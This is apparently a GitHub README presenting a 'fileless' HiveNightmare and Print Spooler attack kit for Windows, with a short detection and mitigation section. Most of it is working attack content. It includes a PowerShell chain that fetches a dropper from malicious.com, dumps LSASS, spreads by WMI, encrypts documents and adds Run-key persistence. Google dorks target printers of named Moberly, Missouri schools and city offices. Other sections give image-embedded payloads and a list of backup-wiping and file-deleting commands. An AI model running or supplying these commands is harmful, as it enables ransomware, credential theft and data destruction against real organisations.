

# HiveNightmare 'Fileless' Exploit PoC:

- [Overview](#overview)
- [Features](#features)
- [Lab Simulation Example](#lab-simulation-example)
- [Reconnaissance with Google Dorks](#reconnaissance-with-google-dorks)
- [LOLBins Overview](#lolbins-overview)
- [Fileless Dropper Embedding](#fileless-dropper-embedding)
- [Exploiting Print Spooler & HiveNightmare](#exploiting-print-spooler--hivenightmare)
- [Reflective DLL Injection](#reflective-dll-injection)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)
- [Detection & Mitigation](#detection--mitigation)
- [Legal Disclaimer](#legal-disclaimer)
- [References & Further Reading](#references--further-reading)

---

![images](https://github.com/user-attachments/assets/e4fe98e6-ccf0-47a4-a467-feab254d8340)

## Overview

**CVE-2021-36934/HiveNightmare** is an educational red/purple team research project that simulates a **fileless malware** attack framework on **Windows 11**. It enables the emulation of real-world adversary kill chains using [MITRE ATT&CK](https://attack.mitre.org/) techniques, with a focus on stealthy, fileless operations.

> **Warning:** For research and training in isolated labs only. **Do not use on production or unauthorized systems.**

## LOLBINS 'Fileless' malware basic example:

The following PowerShell simulation demonstrates a typical fileless ransomware attack chain using built-in Windows tools (LOLBins):

```powershell
# Initial Access: Load dropper
IEX(New-Object Net.WebClient).DownloadString("http://malicious.com/dropper.ps1")

# Execution: Decode and load in-memory payload
$bytes = [System.Convert]::FromBase64String("[Base64Payload]") 
[System.Reflection.Assembly]::Load($bytes)

# Privilege Escalation
Start-Process powershell -Args "-ExecutionPolicy Bypass -File C:\Temp\elevate.ps1" -Verb RunAs

# Credential Access
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Temp\lsass.dmp full

# Lateral Movement
wmic /node:targetPC process call create "powershell.exe -File \\share\payload.ps1"

# File Encryption Example
$files = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.docx,*.pdf -Recurse
foreach ($file in $files) {
  $data = Get-Content $file.FullName -Raw
  $aes = New-Object System.Security.Cryptography.AesManaged
  $aes.Key = [Text.Encoding]::UTF8.GetBytes("RANDOM-GEN-KEY-1234567890123456")
  $aes.IV = New-Object byte[] 16
  $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($data), 0, $data.Length)
  Set-Content -Path $file.FullName -Value ([Convert]::ToBase64String($enc))
}

# Persistence
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "ransomware" -Value "powershell -File C:\Temp\persist.ps1"
```

---

## Reconnaissance with Google Dorks

**Example Objective:** Identify publicly exposed printer services in Moberly, Missouri, potentially vulnerable to exploits like PrintNightmare.

**Sample Google Dork Queries:**

```
inurl:"/hp/device/this.LCDispatcher" "Moberly"
intitle:"Printer Status" "Moberly Public Schools"
intitle:"Web Image Monitor" inurl:"/wim" "Moberly"
inurl:"/printer/main.html" "City of Moberly"
intitle:"Web Jetadmin" "Moberly"
inurl:"/printers/" "Moberly"
inurl:"/PPS/public/" "Moberly"
intitle:"Konica Minolta" inurl:"/wcd/" "Moberly"
intitle:"PaperCut MF" "Moberly"
intitle:"Lexmark" inurl:"/printer/" "Moberly"
intitle:"Canon Remote UI" "Moberly"
intitle:"EpsonNet Config" "Moberly"
```

---

## LOLBins Overview

**Living Off the Land Binaries (LOLBins)** are legitimate, trusted Windows binaries commonly abused by adversaries to bypass security controls and run malicious code filelessly.

**Example Use (Print Service Attack):**

```cmd
rundll32.exe \\10.10.X.X\shared\payload.dll,ReflectEntry
```

> Attackers use LOLBins like `rundll32.exe`, `regsvr32.exe`, and `powershell.exe` to execute payloads from network shares, often after identifying exposed printers or servers via reconnaissance.

---

## Fileless Dropper Embedding

**Goal:** Deliver payloads covertly by embedding archives within images and extracting them using native tools.

**Steps:**

1. **Embed Payload:**
   ```bash
   copy /b nsfw.jpg + payload.7z nsfw.jpg
   ```

2. **Extract & Decode:**
   ```cmd
   certutil -decode nsfw.jpg dropper.7z
   7z x dropper.7z -oC:\Users\Public\
   ```

> This method bypasses traditional file extension filtering and leverages built-in tools for evasive delivery.

---

## Reflective DLL Injection

**Technique:** Load and execute a malicious DLL directly in memory using reflective loading.

**Example:**
```cmd
rundll32.exe \\10.10.X.X\share\nsfw.dll,ReflectEntry
```

> This enables stealthy, in-memory execution without leaving artifacts on disk.

---

## MITRE ATT&CK Mapping

| Phase                | Technique                               | ID                   | Description                                              |
|----------------------|-----------------------------------------|----------------------|----------------------------------------------------------|
| Initial Access       | Valid Accounts / Drive-by Compromise    | T1078, T1189         | Compromising public-facing print interfaces              |
| Execution            | DLL Side-Loading / LOLBins              | T1218, T1055.001     | Running DLLs reflectively via trusted binaries           |
| Privilege Escalation | Print Spooler Exploits / Hive ACL Abuse | T1068, T1003.002     | SYSTEM-level access and SAM hash extraction              |
| Defense Evasion      | Fileless Execution / Obfuscated Files   | T1027, T1202         | Encoded payloads delivered via certutil, mshta, etc.     |
| Credential Access    | LSASS Dumping / SAM Hive Access         | T1003                | Credential dumping post HiveNightmare                    |
| Lateral Movement     | SMB/Net Share Enumeration               | T1021.002            | Spread via printer shares or spooler enumeration         |
| Impact               | Data Destruction / Encryption           | T1485, T1486         | Fileless wiperware triggered via DLL payloads            |

---

### ⚔️ LOLBin Data Destruction – Fast & Lethal

#### 1. `cipher.exe` – Wipe Free Space

```cmd
cipher /w:C:\
```

#### 2. `vssadmin.exe` – Delete Shadow Copies

```cmd
vssadmin delete shadows /all /quiet
```

#### 3. `wbadmin.exe` – Nuke Backups

```cmd
wbadmin delete systemstatebackup -keepVersions:0
```

#### 4. `bcdedit.exe` – Disable Recovery

```cmd
bcdedit /set {default} recoveryenabled No
```

#### 5. `fsutil.exe` – Force Dirty Volume

```cmd
fsutil dirty set C:
```

#### 6. `wmic.exe` – Delete Files via WMI

```cmd
wmic process call create "cmd.exe /c del /f /s /q C:\Users\*.docx"
```

#### 7. `forfiles.exe` – Timed Wipe

```cmd
forfiles /p C:\ /s /d -2 /c "cmd /c del /q @file"
```

#### 8. `schtasks.exe` – Scheduled Kill

```cmd
schtasks /create /tn "Wipe" /tr "cmd /c del /f /q C:\*.xls" /sc once /st 23:59
```

#### 9. `reg.exe` – Registry Destruction

```cmd
reg delete HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f
```

#### 10. `certutil.exe` – Decode + Detonate

```cmd
certutil -decode payload.b64 wipe.exe && wipe.exe
```

## Detection & Mitigation

### Detection

- **Sysmon + Sigma Rules:**
  - Monitor `rundll32.exe` loading non-system DLLs
  - Watch for abnormal use of `certutil.exe`, `regsvr32.exe`, `mshta.exe`
  - Track shadow volume access by non-admins

- **SIEM Examples (ELK/Splunk):**
  - Alerts on execution from public shares
  - Parent/child process anomalies (e.g., `explorer.exe` spawning `rundll32.exe`)
  - Suspicious encoded commands in PowerShell or CMD

### Mitigation

- Disable Print Spooler where not needed:
  ```cmd
  Stop-Service -Name Spooler -Force
  Set-Service -Name Spooler -StartupType Disabled
  ```
- Apply all security patches and harden ACLs
- Block or restrict LOLBins with AppLocker or WDAC
- Use EDR solutions that detect reflective DLL loading and in-memory attacks

---

## Legal Disclaimer

> **All content, code, and techniques in this repository are for educational and authorized penetration testing only. Do not use any part of this project outside of controlled, isolated environments and without explicit permission. The authors assume no liability for misuse.**

---

## References & Further Reading

- [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- [LOLGEN – Generate LOLBin Chains](https://lolgen.hdks.org/)
- [Detecting SeriousSam](https://medium.com/@mvelazco/detecting-serioussam-cve-2021-36934-with-splunk-855dcbb10076)
- [DLL Injection Primer](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- [Print Spooler Exploit Chain](https://itm4n.github.io/printnightmare-not-over/)
- [Fileless Malware – Wikipedia](https://en.wikipedia.org/wiki/Fileless_malware)
- [PrintSpoofer (Original)](https://github.com/itm4n/PrintSpoofer/tree/master)
- [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)
- [Mitre Attck T1055](https://attack.mitre.org/techniques/T1055/001/)
- [Hivenightmare demo](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5)

---

**Stay safe, research responsibly, and always use in a legal and ethical manner.**
